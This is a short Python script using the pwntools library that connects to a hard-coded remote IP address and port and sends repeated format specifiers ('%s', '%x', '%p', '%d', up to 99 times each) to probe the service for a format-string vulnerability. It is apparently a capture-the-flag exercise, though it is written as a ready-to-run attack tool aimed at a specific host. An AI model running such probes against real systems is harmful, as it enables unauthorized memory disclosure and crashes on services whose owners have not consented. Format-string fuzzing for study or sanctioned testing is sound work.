from pwn import *

# Set the target IP and port
ip = '52.172.3.135'
port = 13371

# Establish a connection to the target
conn = remote(ip, port)

# Function to test a single format string
def test_format_string(fmt):
    
    response = conn.recvline()  # Read the response
    conn.sendline(fmt)  # Send the format string to the target
    print(f"Testing: {fmt} | Response: {response}")

# List of format specifiers to test
format_strings = ["%s", "%x", "%p", "%d"]

# Brute-force loop
for fmt in format_strings:
    for i in range(1, 100):  # Adjust the range as needed
        payload = fmt * i
        test_format_string(payload)
        # Add any additional logic here to analyze the response

# Close the connection
conn.close()